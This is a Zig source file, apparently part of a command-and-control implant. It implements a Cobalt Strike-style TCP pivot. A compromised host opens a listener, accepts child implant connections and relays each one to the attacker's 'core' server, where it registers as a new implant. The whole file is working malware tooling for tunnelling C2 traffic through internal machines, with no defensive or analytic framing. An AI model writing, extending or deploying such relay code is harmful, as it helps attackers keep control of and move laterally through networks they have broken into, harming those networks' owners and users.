//! Pivot / relay. Mirrors `crates/implant/src/lib.rs` relay logic.
//!
//! A connected implant can act as a CS-style TCP pivot: bind a listener, splice
//! each accepted child onto a fresh connection to the core. The child's bytes
//! are transparent newline-JSON, so the core registers it as a normal new
//! implant. Relay state is transient (in-memory); on stop, set `done` and dial
//! the listener's own address to unblock the parked accept().

const std = @import("std");
const net = @import("net.zig");
const protocol = @import("protocol.zig");

const RelayHandle = struct {
    done: *std.atomic.Value(bool),
    wake_host: []const u8, // numeric bind ip
    wake_port: u16,
};

var relay_mu: std.atomic.Mutex = .unlocked;
var relays: std.StringHashMap(RelayHandle) = undefined;
var relays_inited: bool = false;

fn ensureRelays(alloc: std.mem.Allocator) void {
    if (!relays_inited) {
        relays = std.StringHashMap(RelayHandle).init(alloc);
        relays_inited = true;
    }
}

fn muLock(mu: *std.atomic.Mutex) void {
    while (!mu.tryLock()) std.atomic.spinLoopHint();
}

/// The core's (host, port) the parent is connected to. Set once at run() start;
/// splice threads read this to dial fresh connections per accepted child.
pub var core_addr: struct { host: []const u8, port: u16 } = .{ .host = "", .port = 0 };

const alloc_ref: std.mem.Allocator = std.heap.page_allocator;

pub fn startRelay(alloc: std.mem.Allocator, relay_id: []const u8, bind_ip: []const u8, port: u16) protocol.ImplantMessage {
    ensureRelays(alloc);
    const ln = net.listen(bind_ip, port) catch |e| {
        return relayError(alloc, relay_id, e);
    };
    const bound_port = ln.bound_port;
    const done = alloc.create(std.atomic.Value(bool)) catch return relayError(alloc, relay_id, error.OutOfMemory);
    done.* = .{ .raw = false };

    muLock(&relay_mu);
    relays.put(relay_id, .{ .done = done, .wake_host = bind_ip, .wake_port = bound_port }) catch {};
    relay_mu.unlock();

    const ctx = alloc.create(AcceptCtx) catch return .{ .relay_started = .{ .relay_id = relay_id, .bind_ip = bind_ip, .port = bound_port } };
    ctx.* = .{ .alloc = alloc, .relay_id = relay_id, .ln = ln, .done = done };
    const t = std.Thread.spawn(.{}, acceptLoop, .{ctx}) catch {
        // Couldn't spawn; stop immediately.
        done.store(true, .seq_cst);
        ln.close();
        return .{ .relay_started = .{ .relay_id = relay_id, .bind_ip = bind_ip, .port = bound_port } };
    };
    t.detach();

    return .{ .relay_started = .{ .relay_id = relay_id, .bind_ip = bind_ip, .port = bound_port } };
}

fn relayError(alloc: std.mem.Allocator, relay_id: []const u8, e: anyerror) protocol.ImplantMessage {
    var buf: [128]u8 = undefined;
    const msg = std.fmt.bufPrint(&buf, "bind: {s}", .{@errorName(e)}) catch "bind failed";
    const dup = alloc.dupe(u8, msg) catch return .{ .relay_error = .{ .relay_id = relay_id, .data = "bind failed" } };
    return .{ .relay_error = .{ .relay_id = relay_id, .data = dup } };
}

pub fn stopRelay(alloc: std.mem.Allocator, relay_id: []const u8) protocol.ImplantMessage {
    _ = alloc;
    ensureRelays(std.heap.page_allocator);
    muLock(&relay_mu);
    const handle = relays.fetchRemove(relay_id);
    relay_mu.unlock();
    if (handle) |h| {
        h.value.done.store(true, .seq_cst);
        // Wake the parked accept() by dialing the listener's own address.
        var host_buf: [64]u8 = undefined;
        const host = std.fmt.bufPrint(&host_buf, "{s}", .{h.value.wake_host}) catch h.value.wake_host;
        if (net.dial(host, h.value.wake_port)) |s| {
            s.close();
        } else |_| {}
    }
    return .{ .relay_stopped = relay_id };
}

const AcceptCtx = struct {
    alloc: std.mem.Allocator,
    relay_id: []const u8,
    ln: net.Listener,
    done: *std.atomic.Value(bool),
};

fn acceptLoop(ctx: *AcceptCtx) void {
    while (true) {
        const child = ctx.ln.accept() catch {
            if (ctx.done.load(.seq_cst)) return;
            return;
        };
        if (ctx.done.load(.seq_cst)) {
            child.close();
            return;
        }
        const sc = ctx.alloc.create(SpliceCtx) catch {
            child.close();
            continue;
        };
        sc.* = .{ .alloc = ctx.alloc, .child = child };
        const t = std.Thread.spawn(.{}, splice, .{sc}) catch {
            child.close();
            ctx.alloc.destroy(sc);
            continue;
        };
        t.detach();
    }
}

const SpliceCtx = struct {
    alloc: std.mem.Allocator,
    child: net.Stream,
};

/// Splice one child's stream onto a fresh connection to the core. Two copy
/// threads (one per direction); when either ends, shutdown both sides so the
/// other copy returns promptly.
fn splice(ctx: *SpliceCtx) void {
    const alloc = ctx.alloc;
    const child = ctx.child;
    const core = net.dial(core_addr.host, core_addr.port) catch {
        child.close();
        alloc.destroy(ctx);
        return;
    };

    const t1 = std.Thread.spawn(.{}, copyDir, .{ child, core }) catch {
        child.close();
        core.close();
        alloc.destroy(ctx);
        return;
    };
    copyDir(core, child);
    t1.join();
    child.shutdownBoth();
    core.shutdownBoth();
    child.close();
    core.close();
    alloc.destroy(ctx);
}

/// Copy bytes from `from` to `to` until EOF or error.
fn copyDir(from: net.Stream, to: net.Stream) void {
    var buf: [8192]u8 = undefined;
    while (true) {
        const n = from.recv(&buf) catch break;
        if (n == 0) break;
        to.sendAll(buf[0..n]) catch break;
    }
}
